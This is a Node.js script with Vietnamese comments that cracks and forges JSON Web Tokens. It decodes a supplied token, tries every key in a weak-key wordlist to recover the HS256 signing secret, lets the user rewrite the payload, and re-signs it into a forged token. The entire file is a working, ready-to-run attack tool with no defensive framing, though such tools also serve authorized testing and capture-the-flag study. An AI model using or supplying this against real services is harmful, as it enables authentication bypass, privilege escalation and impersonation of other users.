import fs from "fs";
import readline from "readline";
import crypto from "crypto";

// Script gộp: nhập token -> decode header/payload -> dò khóa từ weak list ->
// hiển thị payload để sửa -> tái ký token bằng khóa tìm được (HS256) và header cũ.

function base64urlEncode(buf) {
  return buf.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

function base64urlDecodeToString(b64u) {
  const b64 = b64u.replace(/-/g, "+").replace(/_/g, "/");
  const pad = b64.length % 4;
  const padded = b64 + (pad ? "=".repeat(4 - pad) : "");
  return Buffer.from(padded, "base64").toString("utf8");
}

function askInput(prompt) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((res) => rl.question(prompt, (ans) => { rl.close(); res(ans); }));
}

async function main() {
  // 1) Nhập token
  let token = process.argv[2];
  if (!token) token = (await askInput('Nhập JWT (HEADER.PAYLOAD.SIGNATURE): ')).trim();
  if (!token) {
    console.error('Không có JWT được cung cấp.');
    process.exit(1);
  }

  const parts = token.split('.');
  if (parts.length !== 3) {
    console.error('JWT phải có 3 phần, dạng HEADER.PAYLOAD.SIGNATURE');
    process.exit(1);
  }

  const [headerB64, payloadB64, sigB64] = parts;

  // decode header
  let header = {};
  try { header = JSON.parse(base64urlDecodeToString(headerB64)); } catch (e) { console.warn('Cảnh báo: không thể parse header JSON'); }

  // decode payload
  let payload;
  let payloadStr = '';
  try {
    payloadStr = base64urlDecodeToString(payloadB64);
    try { payload = JSON.parse(payloadStr); } catch (e) { payload = payloadStr; }
  } catch (e) { payload = null; }

  console.log('\n-- Thông tin token hiện tại --');
  console.log('Header:', header);
  console.log('Payload:', payload);

  // Tự động lưu payload đã giải mã vào file newpayload.json để dễ sửa
  try {
    const newPayloadPath = new URL('./newpayload.json', import.meta.url).pathname.replace(/^\/(.:)/, '$1');
    if (typeof payload === 'object') {
      fs.writeFileSync(newPayloadPath, JSON.stringify(payload, null, 2), 'utf8');
    } else {
      fs.writeFileSync(newPayloadPath, payloadStr || String(payload || ''), 'utf8');
    }
    console.log('Payload đã được lưu vào', newPayloadPath);
  } catch (e) {
    console.warn('Không lưu được payload vào newpayload.json:', e.message);
  }

  if (header.alg && header.alg !== 'HS256') {
    console.warn(`Header alg là ${header.alg}; script sẽ dùng HS256 để thử/ký.`);
  }

  // 2) Dò khóa từ danh sách weak_keys_1000.txt
  const keysPath = new URL('./weak_keys_1000.txt', import.meta.url).pathname.replace(/^\/(.:)/, '$1');
  let keysRaw;
  try { keysRaw = fs.readFileSync(keysPath, 'utf8'); }
  catch (e) {
    try { keysRaw = fs.readFileSync('weak_keys_1000.txt', 'utf8'); }
    catch (err) { console.error('Không đọc được weak_keys_1000.txt:', err.message); keysRaw = ''; }
  }

  const keys = keysRaw ? keysRaw.split(/\r?\n/).map(s => s.trim()).filter(Boolean) : [];
  console.log(`\nBắt đầu dò khóa (${keys.length} khóa)`);

  const signingInput = `${headerB64}.${payloadB64}`;
  const normalizedTarget = sigB64.replace(/=+$/g, '');

  let foundKey = null;
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i];
    const hmac = crypto.createHmac('sha256', key).update(signingInput).digest();
    const candidate = base64urlEncode(hmac);
    if (candidate === normalizedTarget) { foundKey = key; console.log(`\nTìm thấy khóa sau ${i+1} lần thử`); break; }
    if ((i+1) % 200 === 0) process.stdout.write(`Đã thử ${i+1}/${keys.length}...\r`);
  }

  if (!foundKey) {
    console.log('\nKhông tìm thấy khóa trong danh sách.');
    // hỏi user nhập key thủ công
    const manual = (await askInput('Nhập key thủ công để ký token (hoặc Enter để hủy): ')).trim();
    if (!manual) { console.log('Hủy.'); process.exit(2); }
    foundKey = manual;
  }

  console.log('Khóa được sử dụng:', foundKey);

  // 3) Cho phép sửa payload
  console.log('\nPayload hiện tại:');
  if (typeof payload === 'object') console.log(JSON.stringify(payload, null, 2)); else console.log(payloadStr || payload);

  const edit = (await askInput('\nBạn có muốn sửa payload không? (y/N): ')).trim().toLowerCase();
  let newPayloadObj = null;
  if (edit === 'y' || edit === 'yes') {
    const input = (await askInput('Nhập JSON payload mới hoặc đường dẫn tới file .json: ')).trim();
    if (!input) { console.log('Không nhập payload mới, giữ payload cũ.'); newPayloadObj = payload; }
    else {
      // thử đọc file nếu tồn tại
      try {
        if (fs.existsSync(input)) {
          const raw = fs.readFileSync(input, 'utf8');
          newPayloadObj = JSON.parse(raw);
        } else {
          newPayloadObj = JSON.parse(input);
        }
      } catch (e) {
        console.error('Không parse được JSON payload mới:', e.message);
        process.exit(3);
      }
    }
  } else {
    newPayloadObj = payload;
  }

  // compute new token
  let newPayloadB64;
  if (typeof newPayloadObj === 'string') {
    // was raw string
    newPayloadB64 = base64urlEncode(Buffer.from(newPayloadObj, 'utf8'));
  } else {
    newPayloadB64 = base64urlEncode(Buffer.from(JSON.stringify(newPayloadObj), 'utf8'));
  }

  const newSigningInput = `${headerB64}.${newPayloadB64}`;
  const newHmac = crypto.createHmac('sha256', foundKey).update(newSigningInput).digest();
  const newSig = base64urlEncode(newHmac);
  const newToken = `${headerB64}.${newPayloadB64}.${newSig}`;

  console.log('\n--- Token mới ---');
  console.log(newToken);

  const save = (await askInput('\nBạn có muốn lưu token vào file không? (y/N): ')).trim().toLowerCase();
  if (save === 'y' || save === 'yes') {
    const fn = (await askInput('Nhập tên file (mặc định newtoken.txt): ')).trim() || 'newtoken.txt';
    try { fs.writeFileSync(fn, newToken, 'utf8'); console.log('Đã lưu vào', fn); }
    catch (e) { console.error('Không thể lưu file:', e.message); }
  }

  console.log('\nHoàn tất.');
}

main();
